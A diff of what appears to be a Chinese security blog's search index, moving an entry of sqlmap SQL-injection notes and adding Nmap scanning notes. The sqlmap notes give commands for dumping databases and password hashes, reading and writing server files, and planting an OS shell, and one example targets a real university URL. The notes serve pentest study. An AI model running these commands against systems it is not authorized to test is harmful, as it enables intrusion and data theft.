@@ -254,75 +254,6 @@ show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
       </tags>
   </entry>
   <entry>
-    <title>SqlMap总结</title>
-    <url>/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2>
-<blockquote>
-<p>sqlmap -u “url”<br>
-sqlmap -u URL –dbs<br>
-sqlmap -u URL -D database –tables<br>
-sqlmap -u URL -D database -T tablename –columns<br>
-sqlmap -u URL -D database -T tablename -C columnsname –dump</p>
-</blockquote>
-<h2 id="SqlMap常用命令">SqlMap常用命令</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">-–batch 默认选项运行</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例</span><br><span class="line">--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads&#x3D;                       使用多少线程</span><br><span class="line">–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class="line">–flush-session flush-session会清空当前URL相关的session</span><br><span class="line">–level 设置检测的方方面面和测试用例</span><br><span class="line">    - 默认是1,会尝试POST和GET</span><br><span class="line">    - 2:Cookie也会加入检测</span><br><span class="line">    - 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class="line">-–technique 指定sqlmap使用的检测技术</span><br><span class="line">    B:Boolean-based-blind （布尔型注入）</span><br><span class="line">    U:Union query-based （联合注入）</span><br><span class="line">    E:Error-based （报错型注入)</span><br><span class="line">    S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</span><br><span class="line">    T:Time-based blind （基于时间延迟注入）</span><br></pre></td></tr></table></figure>
-<h2 id="MYSQL新特性secure-file-priv对读写文件的影响">MYSQL新特性secure_file_priv对读写文件的影响</h2>
-<p>secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录</p>
-<ul>
-<li>当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出</li>
-<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
-<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
-</ul>
-<p>解决方法：<br>
-windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>
-linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
-之后需重启Mysql</p>
-<h2 id="SqlMap技巧">SqlMap技巧</h2>
-<h3 id="抓包注入">抓包注入</h3>
-<p>从bp抓包文件中检测</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="指定检测参数">指定检测参数</h3>
-<ul>
-<li>-p 参数名</li>
-<li>参数后面加上<code>*</code>d</li>
-</ul>
-<h3 id="伪静态注入">伪静态注入</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="需要登陆的注入">需要登陆的注入</h3>
-<p>利用cookie参数注入，也可以使用抓包注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="交互式shell">交互式shell</h3>
-<p>写文件的两个前提：</p>
-<ol>
-<li>获取网站的绝对路径</li>
-<li>拥有足够的权限<code>dba/root</code></li>
-</ol>
-<p>首先判断当前是否为dba权限</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133450.png" alt=""></p>
-<p>开始写入shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --os-shell</span><br></pre></td></tr></table></figure>
-<p>选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133910.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622134053.png" alt=""></p>
-<h3 id="文件读写">文件读写</h3>
-<p>读文件需要知道路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini</span><br></pre></td></tr></table></figure>
-<p>写文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt</span><br></pre></td></tr></table></figure>
-<p>表示将本地<code>C:\\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p>
-<h3 id="辅助手工注入">辅助手工注入</h3>
-<p>两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;</span><br><span class="line">sqlmap.py -r &quot;路径&quot; --sql-shell</span><br></pre></td></tr></table></figure>
-<h2 id="SqlMap检测参数">SqlMap检测参数</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--current-user      检索当前用户</span><br><span class="line">--current-db        检索当前数据库</span><br><span class="line">-is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-dbs 所有数据库</span><br><span class="line">--users             列出用户列表</span><br><span class="line">--passwords         列出用户密码的hash值</span><br><span class="line">--os-shell          提示为交互式操作系统shell</span><br><span class="line">--os-pwn            提示为OOB外壳，Meterpreter或VNC</span><br><span class="line">--batch             永远不要要求用户输入，使用默认行为</span><br><span class="line">--sql-shell         提示输入交互式sqlmap shell</span><br><span class="line">请求:</span><br><span class="line">    这些选项可用于指定如何连接到目标URL</span><br><span class="line">    --data&#x3D;DATA         数据字符串通过POST发送</span><br><span class="line">    --cookie&#x3D;COOKIE     HTTP Cookie的值</span><br><span class="line">    --random-agent      随机选择 HTTP User-Agent 头的值</span><br><span class="line">    --proxy&#x3D;PROXY       使用代理去连接目标URL</span><br><span class="line">    --tor               使用匿名网络</span><br><span class="line">    --check-tor         检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">    –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">    –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line">    -o 开启所有优化开关</span><br><span class="line">    –predict-output 预测常见的查询输出</span><br><span class="line">    –keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">    –null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line">    -p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">    –dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line">    –os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">    –prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line">    –suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line">    –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line">    –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">    –risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">    –string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line">    –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">    –text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line">    –technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">    –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">    –union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line">    -f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line">    –common-tables 检查存在共同表</span><br><span class="line">    –common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NSE编写</title>
     <url>/2020/06/27/NSE%E7%BC%96%E5%86%99/</url>
     <content><![CDATA[<h2 id="NSE简介">NSE简介</h2>
@@ -584,6 +515,245 @@ linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
       </tags>
   </entry>
   <entry>
+    <title>SqlMap总结</title>
+    <url>/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="SqlMap测试基本流程">SqlMap测试基本流程</h2>
+<blockquote>
+<p>sqlmap -u “url”<br>
+sqlmap -u URL –dbs<br>
+sqlmap -u URL -D database –tables<br>
+sqlmap -u URL -D database -T tablename –columns<br>
+sqlmap -u URL -D database -T tablename -C columnsname –dump</p>
+</blockquote>
+<h2 id="SqlMap常用命令">SqlMap常用命令</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">-–batch 默认选项运行</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例</span><br><span class="line">--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads&#x3D;                       使用多少线程</span><br><span class="line">–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class="line">–flush-session flush-session会清空当前URL相关的session</span><br><span class="line">–level 设置检测的方方面面和测试用例</span><br><span class="line">    - 默认是1,会尝试POST和GET</span><br><span class="line">    - 2:Cookie也会加入检测</span><br><span class="line">    - 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class="line">-–technique 指定sqlmap使用的检测技术</span><br><span class="line">    B:Boolean-based-blind （布尔型注入）</span><br><span class="line">    U:Union query-based （联合注入）</span><br><span class="line">    E:Error-based （报错型注入)</span><br><span class="line">    S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</span><br><span class="line">    T:Time-based blind （基于时间延迟注入）</span><br></pre></td></tr></table></figure>
+<h2 id="MYSQL新特性secure-file-priv对读写文件的影响">MYSQL新特性secure_file_priv对读写文件的影响</h2>
+<p>secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录</p>
+<ul>
+<li>当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
+</ul>
+<p>解决方法：<br>
+windows下：修改my.ini 在[mysqld]内加入secure_file_priv =<br>
+linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =<br>
+之后需重启Mysql</p>
+<h2 id="SqlMap技巧">SqlMap技巧</h2>
+<h3 id="抓包注入">抓包注入</h3>
+<p>从bp抓包文件中检测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="指定检测参数">指定检测参数</h3>
+<ul>
+<li>-p 参数名</li>
+<li>参数后面加上<code>*</code>d</li>
+</ul>
+<h3 id="伪静态注入">伪静态注入</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="需要登陆的注入">需要登陆的注入</h3>
+<p>利用cookie参数注入，也可以使用抓包注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="交互式shell">交互式shell</h3>
+<p>写文件的两个前提：</p>
+<ol>
+<li>获取网站的绝对路径</li>
+<li>拥有足够的权限<code>dba/root</code></li>
+</ol>
+<p>首先判断当前是否为dba权限</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133450.png" alt=""></p>
+<p>开始写入shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --os-shell</span><br></pre></td></tr></table></figure>
+<p>选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622133910.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200622134053.png" alt=""></p>
+<h3 id="文件读写">文件读写</h3>
+<p>读文件需要知道路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini</span><br></pre></td></tr></table></figure>
+<p>写文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+<p>表示将本地<code>C:\\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p>
+<h3 id="辅助手工注入">辅助手工注入</h3>
+<p>两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;</span><br><span class="line">sqlmap.py -r &quot;路径&quot; --sql-shell</span><br></pre></td></tr></table></figure>
+<h2 id="SqlMap检测参数">SqlMap检测参数</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--current-user      检索当前用户</span><br><span class="line">--current-db        检索当前数据库</span><br><span class="line">-is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-dbs 所有数据库</span><br><span class="line">--users             列出用户列表</span><br><span class="line">--passwords         列出用户密码的hash值</span><br><span class="line">--os-shell          提示为交互式操作系统shell</span><br><span class="line">--os-pwn            提示为OOB外壳，Meterpreter或VNC</span><br><span class="line">--batch             永远不要要求用户输入，使用默认行为</span><br><span class="line">--sql-shell         提示输入交互式sqlmap shell</span><br><span class="line">请求:</span><br><span class="line">    这些选项可用于指定如何连接到目标URL</span><br><span class="line">    --data&#x3D;DATA         数据字符串通过POST发送</span><br><span class="line">    --cookie&#x3D;COOKIE     HTTP Cookie的值</span><br><span class="line">    --random-agent      随机选择 HTTP User-Agent 头的值</span><br><span class="line">    --proxy&#x3D;PROXY       使用代理去连接目标URL</span><br><span class="line">    --tor               使用匿名网络</span><br><span class="line">    --check-tor         检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">    –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">    –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line">    -o 开启所有优化开关</span><br><span class="line">    –predict-output 预测常见的查询输出</span><br><span class="line">    –keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">    –null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line">    -p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">    –dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line">    –os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">    –prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line">    –suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line">    –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line">    –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">    –risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">    –string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line">    –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">    –text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line">    –technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">    –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">    –union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line">    -f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line">    –common-tables 检查存在共同表</span><br><span class="line">    –common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NMAP的使用</title>
+    <url>/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="namp端口状态">namp端口状态</h2>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Open</span>(开放的): 应用程序正在这个端口上监听连接。</span><br><span class="line"><span class="selector-tag">losed</span>(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</span><br><span class="line"><span class="selector-tag">Filtered</span>(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</span><br><span class="line"><span class="selector-tag">Unfiltered</span>(未被过滤的):端口对探测做出了响应，但是<span class="selector-tag">Nmap</span>无法确定它们是关闭还是开放。</span><br><span class="line"><span class="selector-tag">Open</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是开放的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br><span class="line"><span class="selector-tag">Closed</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是关闭的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br></pre></td></tr></table></figure>
+<h2 id="TCP标志位">TCP标志位</h2>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">SYN</span>(synchronous建立联机)</span><br><span class="line"><span class="selector-tag">ACK</span>(acknowledgement 确认)</span><br><span class="line"><span class="selector-tag">PSH</span>(push传送)</span><br><span class="line"><span class="selector-tag">FIN</span>(finish结束)</span><br><span class="line"><span class="selector-tag">RST</span>(reset重置)</span><br><span class="line"><span class="selector-tag">URG</span>(urgent紧急)</span><br></pre></td></tr></table></figure>
+<h2 id="nmap常用命令">nmap常用命令</h2>
+<p>轻量级扫描：</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> 判断哪些主机存活</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.3</span> 开放了哪些端口</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sU</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（<span class="selector-tag">UDP</span>）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-O</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 操作系统识别</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">-oG</span> – <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.1</span>.* | <span class="selector-tag">grep</span> <span class="selector-tag">open</span>列出开放了指定端口的主机列表</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">thief</span><span class="selector-class">.one</span> 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure>
+<p>批量扫描：</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-O</span> <span class="selector-tag">-P0</span> <span class="selector-tag">--open</span> <span class="selector-tag">-n</span> <span class="selector-tag">-oN</span> <span class="selector-tag">result</span><span class="selector-class">.txt</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">-iL</span> <span class="selector-tag">ip</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">--open</span> <span class="selector-tag">--max-hostgroup</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-parallelism</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-rtt-timeout</span> <span class="selector-tag">1000ms</span> <span class="selector-tag">--host-timeout</span> <span class="selector-tag">800s</span> <span class="selector-tag">--max-scan-delay</span> <span class="selector-tag">2000ms</span> <span class="selector-tag">-iL</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">ip</span><span class="selector-class">.txt</span> <span class="selector-tag">-oN</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">result</span>/<span class="selector-tag">result</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+<h2 id="nmap参数">nmap参数</h2>
